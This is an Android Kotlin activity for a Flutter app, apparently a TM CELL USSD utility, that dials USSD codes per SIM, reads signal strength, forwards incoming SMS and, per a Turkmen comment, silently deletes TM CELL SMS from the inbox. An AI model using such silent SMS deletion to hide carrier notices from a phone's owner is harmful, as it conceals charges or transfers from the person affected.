package com.example.tmcell_ussd

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val CHANNEL = "com.tmutility.app/ussd"
    private val TAG = "MainActivity"
    private var methodChannel: MethodChannel? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        methodChannel = MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
        methodChannel?.setMethodCallHandler { call, result ->
            when (call.method) {
                "sendUSSD" -> {
                    val ussdCode = call.argument<String>("ussdCode") ?: "*0800#"
                    val simSlot = call.argument<Int>("simSlot") ?: 0
                    executeUSSD(ussdCode, simSlot, result)
                }
                "getSignalStrength" -> {
                    val simSlot = call.argument<Int>("simSlot") ?: 0
                    getSignalLevel(simSlot, result)
                }
                "checkPermissions" -> {
                    val granted = checkPermissionsGranted()
                    result.success(granted)
                }
                "deleteSms" -> {
                    // Flutter tarapyndan TM CELL SMS'ini sessiz öçürmek üçin çagyrylar
                    val sender = call.argument<String>("sender") ?: ""
                    val body   = call.argument<String>("body")   ?: ""
                    val msgId  = call.argument<String>("msgId")  ?: ""
                    deleteTmCellSms(sender, body, msgId)
                    result.success(true)
                }
                else -> result.notImplemented()
            }
        }

        SmsReceiver.onSmsReceivedListener = { sender, messageBody, msgId ->
            Handler(Looper.getMainLooper()).post {
                val data = mapOf(
                    "sender" to sender,
                    "body"   to messageBody,
                    "msgId"  to msgId
                )
                methodChannel?.invokeMethod("onSmsReceived", data)
            }
        }
    }

    // ── SMS Silme (ContentProvider) ───────────────────────────────────────────
    private fun deleteTmCellSms(sender: String, body: String, msgId: String) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_SMS rugsady ýok – SMS öçürilip bilinmedi")
            return
        }

        try {
            val uri = Telephony.Sms.Inbox.CONTENT_URI
            var deleted = 0

            // 1. Önce msgId ile direkt silmeyi dene
            if (msgId.isNotEmpty()) {
                val id = msgId.toLongOrNull()
                if (id != null) {
                    val specificUri = ContentUris.withAppendedId(Telephony.Sms.CONTENT_URI, id)
                    deleted = contentResolver.delete(specificUri, null, null)
                    Log.d(TAG, "msgId=$msgId bilen $deleted SMS öçürildi")
                }
            }

            // 2. Eğer msgId yoksa veya silme olmadıysa, sender+body ile bul ve sil
            if (deleted == 0) {
                val cursor: Cursor? = contentResolver.query(
                    uri,
                    arrayOf("_id", "address", "body"),
                    "address LIKE ? AND body = ?",
                    arrayOf("%$sender%", body),
                    "date DESC"
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val id = it.getLong(it.getColumnIndexOrThrow("_id"))
                        val deleteUri = ContentUris.withAppendedId(Telephony.Sms.CONTENT_URI, id)
                        val count = contentResolver.delete(deleteUri, null, null)
                        deleted += count
                        Log.d(TAG, "SMS _id=$id öçürildi (sender=$sender)")
                        if (count > 0) break // Ilkinji tabylany öçür
                    }
                }
            }

            if (deleted == 0) {
                Log.w(TAG, "Öçürmek üçin SMS tapylmady (sender=$sender)")
            }
        } catch (e: Exception) {
            Log.e(TAG, "SMS öçürmek säwligi: ${e.message}")
        }
    }

    private fun checkPermissionsGranted(): Boolean {
        val callPerm = ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
        val phoneStatePerm = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
        val receiveSms = ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
        return callPerm && phoneStatePerm && receiveSms
    }

    private fun executeUSSD(ussdCode: String, simSlot: Int, result: MethodChannel.Result) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            result.error("PERMISSION_DENIED", "CALL_PHONE izni talap edilýär", null)
            return
        }

        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        var targetTelephonyManager = telephonyManager
        var targetSubId: Int? = null

        try {
            val subManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val activeSubs = subManager?.activeSubscriptionInfoList
                if (activeSubs != null && simSlot < activeSubs.size) {
                    targetSubId = activeSubs[simSlot].subscriptionId
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        targetTelephonyManager = telephonyManager.createForSubscriptionId(targetSubId)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                targetTelephonyManager.sendUssdRequest(
                    ussdCode,
                    object : TelephonyManager.UssdResponseCallback() {
                        override fun onReceiveUssdResponse(
                            telephonyManager: TelephonyManager?,
                            request: String?,
                            response: CharSequence?
                        ) {
                            val responseString = response?.toString() ?: ""
                            result.success(responseString)
                        }

                        override fun onReceiveUssdResponseFailed(
                            telephonyManager: TelephonyManager?,
                            request: String?,
                            failureCode: Int
                        ) {
                            dialUSSDFallback(ussdCode, simSlot, targetSubId, result)
                        }
                    },
                    Handler(Looper.getMainLooper())
                )
            } catch (e: Exception) {
                dialUSSDFallback(ussdCode, simSlot, targetSubId, result)
            }
        } else {
            dialUSSDFallback(ussdCode, simSlot, targetSubId, result)
        }
    }

    private fun dialUSSDFallback(ussdCode: String, simSlot: Int, subId: Int?, result: MethodChannel.Result) {
        try {
            val encodedCode = Uri.encode(ussdCode)
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$encodedCode")).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                putExtra("com.android.phone.force.slot", true)
                putExtra("Cdma_SubId", simSlot)
                putExtra("simSlot", simSlot)
                putExtra("com.android.phone.extra.slot", simSlot)
                if (subId != null) {
                    putExtra("subscription", subId)
                    putExtra("subscription_id", subId)
                }
            }
            startActivity(intent)
            result.success("USSD awtomatiki arama tetiklendi ($ussdCode)")
        } catch (e: Exception) {
            result.error("INTENT_ERROR", e.message ?: "Arama säwligi", null)
        }
    }

    private fun getSignalLevel(simSlot: Int, result: MethodChannel.Result) {
        var signalLevel = 4
        try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            var targetManager = telephonyManager

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val subManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val activeSubs = subManager?.activeSubscriptionInfoList
                if (activeSubs != null && simSlot < activeSubs.size) {
                    val subId = activeSubs[simSlot].subscriptionId
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        targetManager = telephonyManager.createForSubscriptionId(subId)
                    }
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                val signalStrength = targetManager.signalStrength
                if (signalStrength != null) {
                    signalLevel = signalStrength.level
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        result.success(signalLevel)
    }
}
